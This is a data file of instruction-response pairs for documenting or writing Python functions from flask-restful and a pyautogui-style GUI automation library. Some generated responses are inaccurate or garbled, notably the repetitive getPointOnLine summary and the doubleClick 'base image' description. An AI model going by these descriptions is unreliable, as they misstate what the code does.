{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _init_app(self, app):\n        app.handle_exception = partial(self.error_router, app.handle_exception)\n        app.handle_user_exception = partial(self.error_router, app.handle_user_exception)\n\n        if len(self.resources) > 0:\n            for resource, urls, kwargs in self.resources:\n                self._register_view(app, resource, *urls, **kwargs)", "response": "Perform initialization actions with the given flask. Flask object."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef owns_endpoint(self, endpoint):\n\n        if self.blueprint:\n            if endpoint.startswith(self.blueprint.name):\n                endpoint = endpoint.split(self.blueprint.name + '.', 1)[-1]\n            else:\n                return False\n        return endpoint in self.endpoints", "response": "Tests if an endpoint name belongs to this Api."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndetermining if error should be handled with FR or default Flask", "response": "def _should_use_fr_error_handler(self):\n        \"\"\" Determine if error should be handled with FR or default Flask\n\n        The goal is to return Flask error handlers for non-FR-related routes,\n        and FR errors (with the correct media type) for FR endpoints. This\n        method currently handles 404 and 405 errors.\n\n        :return: bool\n        \"\"\"\n        adapter = current_app.create_url_adapter(request)\n\n        try:\n            adapter.match()\n        except MethodNotAllowed as e:\n            # Check if the other HTTP methods at this url would hit the Api\n            valid_route_method = e.valid_methods[0]\n            rule, _ = adapter.match(method=valid_route_method, return_rule=True)\n            return self.owns_endpoint(rule.endpoint)\n        except NotFound:\n            return self.catch_all_404s\n        except:\n            # Werkzeug throws other kinds of exceptions, such as Redirect\n            pass"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _has_fr_route(self):\n        # 404's, 405's, which might not have a url_rule\n        if self._should_use_fr_error_handler():\n            return True\n        # for all other errors, just check if FR dispatched the route\n        if not request.url_rule:\n            return False\n        return self.owns_endpoint(request.url_rule.endpoint)", "response": "Returns True if the request was to a Flask endpoint False otherwise."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef error_router(self, original_handler, e):\n        if self._has_fr_route():\n            try:\n                return self.handle_error(e)\n            except Exception:\n                pass  # Fall through to original handler\n        return original_handler(e)", "response": "This function decides whether the error occured in a flask - restful endpoint or not."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef add_resource(self, resource, *urls, **kwargs):\n        if self.app is not None:\n            self._register_view(self.app, resource, *urls, **kwargs)\n        else:\n            self.resources.append((resource, urls, kwargs))", "response": "Adds a resource to the api."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef resource(self, *urls, **kwargs):\n        def decorator(cls):\n            self.add_resource(cls, *urls, **kwargs)\n            return cls\n        return decorator", "response": "A decorator that creates a class that adds it to the the\n            api."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef output(self, resource):\n        @wraps(resource)\n        def wrapper(*args, **kwargs):\n            resp = resource(*args, **kwargs)\n            if isinstance(resp, ResponseBase):  # There may be a better way to test\n                return resp\n            data, code, headers = unpack(resp)\n            return self.make_response(data, code, headers=headers)\n        return wrapper", "response": "Wraps a resource function to return a response object"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef url_for(self, resource, **values):\n        endpoint = resource.endpoint\n        if self.blueprint:\n            endpoint = '{0}.{1}'.format(self.blueprint.name, endpoint)\n        return url_for(endpoint, **values)", "response": "Generates a URL to the given resource."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef make_response(self, data, *args, **kwargs):\n        default_mediatype = kwargs.pop('fallback_mediatype', None) or self.default_mediatype\n        mediatype = request.accept_mimetypes.best_match(\n            self.representations,\n            default=default_mediatype,\n        )\n        if mediatype is None:\n            raise NotAcceptable()\n        if mediatype in self.representations:\n            resp = self.representations[mediatype](data, *args, **kwargs)\n            resp.headers['Content-Type'] = mediatype\n            return resp\n        elif mediatype == 'text/plain':\n            resp = original_flask_make_response(str(data), *args, **kwargs)\n            resp.headers['Content-Type'] = 'text/plain'\n            return resp\n        else:\n            raise InternalServerError()", "response": "Creates a response object for the requested media - level - related resource."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef mediatypes(self):\n        return [h for h, q in sorted(request.accept_mimetypes,\n                                     key=operator.itemgetter(1), reverse=True)]", "response": "Returns a list of requested mediatypes sent in the Accept header"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef representation(self, mediatype):\n        def wrapper(func):\n            self.representations[mediatype] = func\n            return func\n        return wrapper", "response": "Decorator for the API representation"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\npull values off the request in the provided location", "response": "def source(self, request):\n        \"\"\"Pulls values off the request in the provided location\n        :param request: The flask request object to parse arguments from\n        \"\"\"\n        if isinstance(self.location, six.string_types):\n            value = getattr(request, self.location, MultiDict())\n            if callable(value):\n                value = value()\n            if value is not None:\n                return value\n        else:\n            values = MultiDict()\n            for l in self.location:\n                value = getattr(request, l, None)\n                if callable(value):\n                    value = value()\n                if value is not None:\n                    values.update(value)\n            return values\n\n        return MultiDict()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef handle_validation_error(self, error, bundle_errors):\n        error_str = six.text_type(error)\n        error_msg = self.help.format(error_msg=error_str) if self.help else error_str\n        msg = {self.name: error_msg}\n\n        if current_app.config.get(\"BUNDLE_ERRORS\", False) or bundle_errors:\n            return error, msg\n        flask_restful.abort(400, message=msg)", "response": "Called when an error occurs while parsing the a\n            dictionary."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nparses the argument value from the request and returns a list of a objects.", "response": "def parse(self, request, bundle_errors=False):\n        \"\"\"Parses argument value(s) from the request, converting according to\n        the argument's type.\n\n        :param request: The flask request object to parse arguments from\n        :param bundle_errors: Do not abort when first error occurs, return a\n            dict with the name of the argument and the error message to be\n            bundled\n        \"\"\"\n        source = self.source(request)\n\n        results = []\n\n        # Sentinels\n        _not_found = False\n        _found = True\n\n        for operator in self.operators:\n            name = self.name + operator.replace(\"=\", \"\", 1)\n            if name in source:\n                # Account for MultiDict and regular dict\n                if hasattr(source, \"getlist\"):\n                    values = source.getlist(name)\n                else:\n                    values = source.get(name)\n                    if not (isinstance(values, collections.MutableSequence) and self.action == 'append'):\n                        values = [values]\n\n                for value in values:\n                    if hasattr(value, \"strip\") and self.trim:\n                        value = value.strip()\n                    if hasattr(value, \"lower\") and not self.case_sensitive:\n                        value = value.lower()\n\n                        if hasattr(self.choices, \"__iter__\"):\n                            self.choices = [choice.lower()\n                                            for choice in self.choices]\n\n                    try:\n                        value = self.convert(value, operator)\n                    except Exception as error:\n                        if self.ignore:\n                            continue\n                        return self.handle_validation_error(error, bundle_errors)\n\n                    if self.choices and value not in self.choices:\n                        if current_app.config.get(\"BUNDLE_ERRORS\", False) or bundle_errors:\n                            return self.handle_validation_error(\n                                ValueError(u\"{0} is not a valid choice\".format(\n                                    value)), bundle_errors)\n                        self.handle_validation_error(\n                                ValueError(u\"{0} is not a valid choice\".format(\n                                    value)), bundle_errors)\n\n                    if name in request.unparsed_arguments:\n                        request.unparsed_arguments.pop(name)\n                    results.append(value)\n\n        if not results and self.required:\n            if isinstance(self.location, six.string_types):\n                error_msg = u\"Missing required parameter in {0}\".format(\n                    _friendly_location.get(self.location, self.location)\n                )\n            else:\n                friendly_locations = [_friendly_location.get(loc, loc)\n                                      for loc in self.location]\n                error_msg = u\"Missing required parameter in {0}\".format(\n                    ' or '.join(friendly_locations)\n                )\n            if current_app.config.get(\"BUNDLE_ERRORS\", False) or bundle_errors:\n                return self.handle_validation_error(ValueError(error_msg), bundle_errors)\n            self.handle_validation_error(ValueError(error_msg), bundle_errors)\n\n        if not results:\n            if callable(self.default):\n                return self.default(), _not_found\n            else:\n                return self.default, _not_found\n\n        if self.action == 'append':\n            return results, _found\n\n        if self.action == 'store' or len(results) == 1:\n            return results[0], _found\n        return results, _found"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef add_argument(self, *args, **kwargs):\n\n        if len(args) == 1 and isinstance(args[0], self.argument_class):\n            self.args.append(args[0])\n        else:\n            self.args.append(self.argument_class(*args, **kwargs))\n\n        # Do not know what other argument classes are out there\n        if self.trim and self.argument_class is Argument:\n            # enable trim for appended element\n            self.args[-1].trim = kwargs.get('trim', self.trim)\n\n        return self", "response": "Adds an argument to be parsed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nparse all arguments from the provided request and return the results as a Namespace object.", "response": "def parse_args(self, req=None, strict=False, http_error_code=400):\n        \"\"\"Parse all arguments from the provided request and return the results\n        as a Namespace\n\n        :param req: Can be used to overwrite request from Flask\n        :param strict: if req includes args not in parser, throw 400 BadRequest exception\n        :param http_error_code: use custom error code for `flask_restful.abort()`\n        \"\"\"\n        if req is None:\n            req = request\n\n        namespace = self.namespace_class()\n\n        # A record of arguments not yet parsed; as each is found\n        # among self.args, it will be popped out\n        req.unparsed_arguments = dict(self.argument_class('').source(req)) if strict else {}\n        errors = {}\n        for arg in self.args:\n            value, found = arg.parse(req, self.bundle_errors)\n            if isinstance(value, ValueError):\n                errors.update(found)\n                found = None\n            if found or arg.store_missing:\n                namespace[arg.dest or arg.name] = value\n        if errors:\n            flask_restful.abort(http_error_code, message=errors)\n\n        if strict and req.unparsed_arguments:\n            raise exceptions.BadRequest('Unknown arguments: %s'\n                                        % ', '.join(req.unparsed_arguments.keys()))\n\n        return namespace"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef copy(self):\n        parser_copy = self.__class__(self.argument_class, self.namespace_class)\n        parser_copy.args = deepcopy(self.args)\n        parser_copy.trim = self.trim\n        parser_copy.bundle_errors = self.bundle_errors\n        return parser_copy", "response": "Creates a copy of this RequestParser with the same set of arguments"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreplaces the argument matching the given name with a new version.", "response": "def replace_argument(self, name, *args, **kwargs):\n        \"\"\" Replace the argument matching the given name with a new version. \"\"\"\n        new_arg = self.argument_class(name, *args, **kwargs)\n        for index, arg in enumerate(self.args[:]):\n            if new_arg.name == arg.name:\n                del self.args[index]\n                self.args.append(new_arg)\n                break\n        return self"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef remove_argument(self, name):\n        for index, arg in enumerate(self.args[:]):\n            if name == arg.name:\n                del self.args[index]\n                break\n        return self", "response": "Removes the argument matching the given name."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the value for the given key from the object.", "response": "def output(self, key, obj):\n        \"\"\"Pulls the value for the given key from the object, applies the\n        field's formatting and returns the result. If the key is not found\n        in the object, returns the default value. Field classes that create\n        values which do not require the existence of the key in the object\n        should override this and return the desired value.\n\n        :exception MarshallingException: In case of formatting problem\n        \"\"\"\n\n        value = get_value(key if self.attribute is None else self.attribute, obj)\n\n        if value is None:\n            return self.default\n\n        return self.format(value)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef url(value):\n    if not url_regex.search(value):\n        message = u\"{0} is not a valid URL\".format(value)\n        if url_regex.search('http://' + value):\n            message += u\". Did you mean: http://{0}\".format(value)\n        raise ValueError(message)\n    return value", "response": "Validate a URL.\n\n    :param string value: The URL to validate\n    :returns: The URL if valid.\n    :raises: ValueError"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nnormalize datetime intervals. Given a pair of datetime.date or datetime.datetime objects, returns a 2-tuple of tz-aware UTC datetimes spanning the same interval. For datetime.date objects, the returned interval starts at 00:00:00.0 on the first date and ends at 00:00:00.0 on the second. Naive datetimes are upgraded to UTC. Timezone-aware datetimes are normalized to the UTC tzdata. Params: - start: A date or datetime - end: A date or datetime", "response": "def _normalize_interval(start, end, value):\n    \"\"\"Normalize datetime intervals.\n\n    Given a pair of datetime.date or datetime.datetime objects,\n    returns a 2-tuple of tz-aware UTC datetimes spanning the same interval.\n\n    For datetime.date objects, the returned interval starts at 00:00:00.0\n    on the first date and ends at 00:00:00.0 on the second.\n\n    Naive datetimes are upgraded to UTC.\n\n    Timezone-aware datetimes are normalized to the UTC tzdata.\n\n    Params:\n        - start: A date or datetime\n        - end: A date or datetime\n    \"\"\"\n    if not isinstance(start, datetime):\n        start = datetime.combine(start, START_OF_DAY)\n        end = datetime.combine(end, START_OF_DAY)\n\n    if start.tzinfo is None:\n        start = pytz.UTC.localize(start)\n        end = pytz.UTC.localize(end)\n    else:\n        start = start.astimezone(pytz.UTC)\n        end = end.astimezone(pytz.UTC)\n\n    return start, end"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ntry to parse an interval from a string.", "response": "def _parse_interval(value):\n    \"\"\"Do some nasty try/except voodoo to get some sort of datetime\n    object(s) out of the string.\n    \"\"\"\n    try:\n        return sorted(aniso8601.parse_interval(value))\n    except ValueError:\n        try:\n            return aniso8601.parse_datetime(value), None\n        except ValueError:\n            return aniso8601.parse_date(value), None"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef iso8601interval(value, argument='argument'):\n\n    try:\n        start, end = _parse_interval(value)\n\n        if end is None:\n            end = _expand_datetime(start, value)\n\n        start, end = _normalize_interval(start, end, value)\n\n    except ValueError:\n        raise ValueError(\n            \"Invalid {arg}: {value}. {arg} must be a valid ISO8601 \"\n            \"date/time interval.\".format(arg=argument, value=value),\n        )\n\n    return start, end", "response": "Parses ISO 8601 - formatted datetime intervals into two UTC datetimes."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nrestrict input type to the natural numbers 0 1 2 3 etc.", "response": "def natural(value, argument='argument'):\n    \"\"\" Restrict input type to the natural numbers (0, 1, 2, 3...) \"\"\"\n    value = _get_integer(value)\n    if value < 0:\n        error = ('Invalid {arg}: {value}. {arg} must be a non-negative '\n                 'integer'.format(arg=argument, value=value))\n        raise ValueError(error)\n    return value"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nrestrict input type to the positive integers 1 2 3 etc.", "response": "def positive(value, argument='argument'):\n    \"\"\" Restrict input type to the positive integers (1, 2, 3...) \"\"\"\n    value = _get_integer(value)\n    if value < 1:\n        error = ('Invalid {arg}: {value}. {arg} must be a positive '\n                 'integer'.format(arg=argument, value=value))\n        raise ValueError(error)\n    return value"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing the string true or false as a boolean.", "response": "def boolean(value):\n    \"\"\"Parse the string ``\"true\"`` or ``\"false\"`` as a boolean (case\n    insensitive). Also accepts ``\"1\"`` and ``\"0\"`` as ``True``/``False``\n    (respectively). If the input is from the request JSON body, the type is\n    already a native python boolean, and will be passed through without\n    further parsing.\n    \"\"\"\n    if isinstance(value, bool):\n        return value\n\n    if not value:\n        raise ValueError(\"boolean type must be non-null\")\n    value = value.lower()\n    if value in ('true', '1',):\n        return True\n    if value in ('false', '0',):\n        return False\n    raise ValueError(\"Invalid literal for boolean(): {0}\".format(value))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _keyDown(key):\n    if key not in keyboardMapping or keyboardMapping[key] is None:\n        return\n\n    if type(key) == int:\n        fake_input(_display, X.KeyPress, key)\n        _display.sync()\n        return\n\n    needsShift = pyautogui.isShiftCharacter(key)\n    if needsShift:\n        fake_input(_display, X.KeyPress, keyboardMapping['shift'])\n\n    fake_input(_display, X.KeyPress, keyboardMapping[key])\n\n    if needsShift:\n        fake_input(_display, X.KeyRelease, keyboardMapping['shift'])\n    _display.sync()", "response": "Performs a keyboard key press without the release."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _keyUp(key):\n\n    \"\"\"\n    Release a given character key. Also works with character keycodes as\n    integers, but not keysyms.\n    \"\"\"\n    if key not in keyboardMapping or keyboardMapping[key] is None:\n        return\n\n    if type(key) == int:\n        keycode = key\n    else:\n        keycode = keyboardMapping[key]\n\n    fake_input(_display, X.KeyRelease, keycode)\n    _display.sync()", "response": "Performs a keyboard key release up."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns dict of window title and handle for all visible windows", "response": "def getWindows():    #https://sjohannes.wordpress.com/2012/03/23/win32-python-getting-all-window-titles/\n    \"\"\"Return dict: {'window title' : window handle} for all visible windows\"\"\"\n    titles = {}\n\n    def foreach_window(hwnd, lparam):\n        if IsWindowVisible(hwnd):\n            length = GetWindowTextLength(hwnd)\n            buff = ctypes.create_unicode_buffer(length + 1)\n            GetWindowText(hwnd, buff, length + 1)\n            titles[buff.value] = hwnd\n        return True\n    EnumWindows(EnumWindowsProc(foreach_window), 0)\n\n    return titles"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef getWindow(title, exact=False):\n    titles = getWindows()\n    hwnd = titles.get(title, None)\n    if not hwnd and not exact:\n        for k, v in titles.items():\n            if title in k:\n                hwnd = v\n                break\n    if hwnd:\n        return Window(hwnd)\n    else:\n        return None", "response": "Return Window object if title or its part found in visible windows titles else return None"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_position(self, x, y, width, height):\n        SetWindowPos(self._hwnd, None, x, y, width, height, ctypes.c_uint(0))", "response": "Set top - left corner position and size"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmoves the window top - left corner to position", "response": "def move(self, x, y):\n        \"\"\"Move window top-left corner to position\"\"\"\n        SetWindowPos(self._hwnd, None, x, y, 0, 0, SWP_NOSIZE)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_position(self):\n        rect = _Rect()\n        GetWindowRect(self._hwnd, ctypes.pointer(rect))\n        return rect.left, rect.top, rect.right, rect.bottom", "response": "Returns tuple of 4 numbers : left top right bottom right corners"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef getPointOnLine(x1, y1, x2, y2, n):\n    x = ((x2 - x1) * n) + x1\n    y = ((y2 - y1) * n) + y1\n    return (x, y)", "response": "Returns the x y tuple of the point that has progressed a proportion\n    n along the line defined by the two x y coordinates x2 y2 x2 y2 n along the line defined by the two x y coordinates y2 x2 y2 n along the line defined by the two x y coordinates y2 x2 y2 n."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nunpacks x and y coordinates into the correct order.", "response": "def _unpackXY(x, y):\n    \"\"\"If x is a sequence and y is None, returns x[0], y[0]. Else, returns x, y.\n\n    On functions that receive a pair of x,y coordinates, they can be passed as\n    separate arguments, or as a single two-element sequence.\n    \"\"\"\n    if isinstance(x, str):\n        # x parameter is the string of an image filename to find and click on:\n        x, y = center(locateOnScreen(x))\n\n    elif isinstance(x, collectionsSequence):\n        if len(x) == 2:\n            if y is None:\n                x, y = x\n            else:\n                raise ValueError('When passing a sequence at the x argument, the y argument must not be passed (received {0}).'.format(repr(y)))\n        else:\n            raise ValueError('The supplied sequence must have exactly 2 elements ({0} were received).'.format(len(x)))\n    else:\n        pass # x and y are just number values\n\n    return x, y"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the current xy coordinates of the mouse cursor.", "response": "def position(x=None, y=None):\n    \"\"\"Returns the current xy coordinates of the mouse cursor as a two-integer\n    tuple.\n\n    Args:\n      x (int, None, optional) - If not None, this argument overrides the x in\n        the return value.\n      y (int, None, optional) - If not None, this argument overrides the y in\n        the return value.\n\n    Returns:\n      (x, y) tuple of the current xy coordinates of the mouse cursor.\n    \"\"\"\n    posx, posy = platformModule._position()\n    posx = int(posx)\n    posy = int(posy)\n    if x is not None: # If set, the x parameter overrides the return value.\n        posx = int(x)\n    if y is not None: # If set, the y parameter overrides the return value.\n        posy = int(y)\n    return Point(posx, posy)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef onScreen(x, y=None):\n    x, y = _unpackXY(x, y)\n    x = int(x)\n    y = int(y)\n\n    width, height = platformModule._size()\n    return 0 <= x < width and 0 <= y < height", "response": "Returns whether the given xy coordinates are on the screen or not."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nperforming a mouse button up and releasing a resource.", "response": "def mouseUp(x=None, y=None, button='left', duration=0.0, tween=linear, pause=None, _pause=True):\n    \"\"\"Performs releasing a mouse button up (but not down beforehand).\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      x (int, float, None, tuple, optional): The x position on the screen where the\n        mouse up happens. None by default. If tuple, this is used for x and y.\n        If x is a str, it's considered a filename of an image to find on\n        the screen with locateOnScreen() and click the center of.\n      y (int, float, None, optional): The y position on the screen where the\n        mouse up happens. None by default.\n      button (str, int, optional): The mouse button released. Must be one of\n        'left', 'middle', 'right' (or 1, 2, or 3) respectively. 'left' by\n        default.\n\n    Returns:\n      None\n\n    Raises:\n      ValueError: If button is not one of 'left', 'middle', 'right', 1, 2, or 3\n    \"\"\"\n    if button not in ('left', 'middle', 'right', 1, 2, 3):\n        raise ValueError(\"button argument must be one of ('left', 'middle', 'right', 1, 2, 3), not %s\" % button)\n\n    _failSafeCheck()\n    x, y = _unpackXY(x, y)\n\n    _mouseMoveDrag('move', x, y, 0, 0, duration=0, tween=None)\n\n    x, y = platformModule._position()\n    if button == 1 or str(button).lower() == 'left':\n        platformModule._mouseUp(x, y, 'left')\n    elif button == 2 or str(button).lower() == 'middle':\n        platformModule._mouseUp(x, y, 'middle')\n    elif button == 3 or str(button).lower() == 'right':\n        platformModule._mouseUp(x, y, 'right')\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nperforming a mouse button down and then immediately releasing it.", "response": "def click(x=None, y=None, clicks=1, interval=0.0, button='left', duration=0.0, tween=linear, pause=None, _pause=True):\n    \"\"\"Performs pressing a mouse button down and then immediately releasing it.\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      x (int, float, None, tuple, str, optional): The x position on the screen where\n        the click happens. None by default. If tuple, this is used for x and y.\n        If x is a str, it's considered a filename of an image to find on\n        the screen with locateOnScreen() and click the center of.\n      y (int, float, None, optional): The y position on the screen where the\n        click happens. None by default.\n      clicks (int, optional): The number of clicks to perform. 1 by default.\n        For example, passing 2 would do a doubleclick.\n      interval (float, optional): The number of seconds in between each click,\n        if the number of clicks is greater than 1. 0.0 by default, for no\n        pause in between clicks.\n      button (str, int, optional): The mouse button clicked. Must be one of\n        'left', 'middle', 'right' (or 1, 2, or 3) respectively. 'left' by\n        default.\n\n    Returns:\n      None\n\n    Raises:\n      ValueError: If button is not one of 'left', 'middle', 'right', 1, 2, 3\n    \"\"\"\n    if button not in ('left', 'middle', 'right', 1, 2, 3):\n        raise ValueError(\"button argument must be one of ('left', 'middle', 'right', 1, 2, 3)\")\n\n    _failSafeCheck()\n    x, y = _unpackXY(x, y)\n\n    _mouseMoveDrag('move', x, y, 0, 0, duration, tween)\n\n    x, y = platformModule._position()\n    for i in range(clicks):\n        _failSafeCheck()\n        if button == 1 or str(button).lower() == 'left':\n            platformModule._click(x, y, 'left')\n        elif button == 2 or str(button).lower() == 'middle':\n            platformModule._click(x, y, 'middle')\n        elif button == 3 or str(button).lower() == 'right':\n            platformModule._click(x, y, 'right')\n        else:\n            # These mouse buttons for hor. and vert. scrolling only apply to x11:\n            platformModule._click(x, y, button)\n\n        time.sleep(interval)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nperforming a right mouse button click on the .", "response": "def rightClick(x=None, y=None, duration=0.0, tween=linear, pause=None, _pause=True):\n    \"\"\"Performs a right mouse button click.\n\n    This is a wrapper function for click('right', x, y).\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      x (int, float, None, tuple, optional): The x position on the screen where the\n        click happens. None by default. If tuple, this is used for x and y.\n        If x is a str, it's considered a filename of an image to find on\n        the screen with locateOnScreen() and click the center of.\n      y (int, float, None, optional): The y position on the screen where the\n        click happens. None by default.\n\n    Returns:\n      None\n    \"\"\"\n    _failSafeCheck()\n\n    click(x, y, 1, 0.0, 'right', _pause=False)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef doubleClick(x=None, y=None, interval=0.0, button='left', duration=0.0, tween=linear, pause=None, _pause=True):\n    _failSafeCheck()\n\n    # Multiple clicks work different in OSX\n    if sys.platform == 'darwin':\n        x, y = _unpackXY(x, y)\n        _mouseMoveDrag('move', x, y, 0, 0, duration=0, tween=None)\n        x, y = platformModule._position()\n        platformModule._multiClick(x, y, button, 2)\n    else:\n        click(x, y, 2, interval, button, _pause=False)\n\n    _autoPause(pause, _pause)", "response": "Performs a double click on the base image."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nperforms a vertical or horizontal scroll of the underlying .", "response": "def scroll(clicks, x=None, y=None, pause=None, _pause=True):\n    \"\"\"Performs a scroll of the mouse scroll wheel.\n\n    Whether this is a vertical or horizontal scroll depends on the underlying\n    operating system.\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      clicks (int, float): The amount of scrolling to perform.\n      x (int, float, None, tuple, optional): The x position on the screen where the\n        click happens. None by default. If tuple, this is used for x and y.\n      y (int, float, None, optional): The y position on the screen where the\n        click happens. None by default.\n\n    Returns:\n      None\n    \"\"\"\n    _failSafeCheck()\n    if type(x) in (tuple, list):\n        x, y = x[0], x[1]\n    x, y = position(x, y)\n\n    platformModule._scroll(clicks, x, y)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nperform an explicitly horizontal scroll of the mouse scroll wheel.", "response": "def hscroll(clicks, x=None, y=None, pause=None, _pause=True):\n    \"\"\"Performs an explicitly horizontal scroll of the mouse scroll wheel,\n    if this is supported by the operating system. (Currently just Linux.)\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      clicks (int, float): The amount of scrolling to perform.\n      x (int, float, None, tuple, optional): The x position on the screen where the\n        click happens. None by default. If tuple, this is used for x and y.\n      y (int, float, None, optional): The y position on the screen where the\n        click happens. None by default.\n\n    Returns:\n      None\n    \"\"\"\n    _failSafeCheck()\n    if type(x) in (tuple, list):\n        x, y = x[0], x[1]\n    x, y = position(x, y)\n\n    platformModule._hscroll(clicks, x, y)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nperform an explicitly vertical scroll of the mouse scroll wheel.", "response": "def vscroll(clicks, x=None, y=None, pause=None, _pause=True):\n    \"\"\"Performs an explicitly vertical scroll of the mouse scroll wheel,\n    if this is supported by the operating system. (Currently just Linux.)\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      clicks (int, float): The amount of scrolling to perform.\n      x (int, float, None, tuple, optional): The x position on the screen where the\n        click happens. None by default. If tuple, this is used for x and y.\n      y (int, float, None, optional): The y position on the screen where the\n        click happens. None by default.\n\n    Returns:\n      None\n    \"\"\"\n    _failSafeCheck()\n    if type(x) in (tuple, list):\n        x, y = x[0], x[1]\n    x, y = position(x, y)\n    platformModule._vscroll(clicks, x, y)\n\n    _autoPause(pause, _pause)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef moveTo(x=None, y=None, duration=0.0, tween=linear, pause=None, _pause=True):\n    _failSafeCheck()\n    x, y = _unpackXY(x, y)\n\n    _mouseMoveDrag('move', x, y, 0, 0, duration, tween)\n\n    _autoPause(pause, _pause)", "response": "Moves the mouse cursor to a point on the screen."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nmove the mouse cursor to a point on the screen relative to its current cursor position.", "response": "def moveRel(xOffset=None, yOffset=None, duration=0.0, tween=linear, pause=None, _pause=True):\n    \"\"\"Moves the mouse cursor to a point on the screen, relative to its current\n    position.\n\n    The x and y parameters detail where the mouse event happens. If None, the\n    current mouse position is used. If a float value, it is rounded down. If\n    outside the boundaries of the screen, the event happens at edge of the\n    screen.\n\n    Args:\n      x (int, float, None, tuple, optional): How far left (for negative values) or\n        right (for positive values) to move the cursor. 0 by default. If tuple, this is used for x and y.\n      y (int, float, None, optional): How far up (for negative values) or\n        down (for positive values) to move the cursor. 0 by default.\n      duration (float, optional): The amount of time it takes to move the mouse\n        cursor to the new xy coordinates. If 0, then the mouse cursor is moved\n        instantaneously. 0.0 by default.\n      tween (func, optional): The tweening function used if the duration is not\n        0. A linear tween is used by default. See the tweens.py file for\n        details.\n\n    Returns:\n      None\n    \"\"\"\n\n    _failSafeCheck()\n\n    xOffset, yOffset = _unpackXY(xOffset, yOffset)\n\n    _mouseMoveDrag('move', None, None, xOffset, yOffset, duration, tween)\n\n    _autoPause(pause, _pause)"}
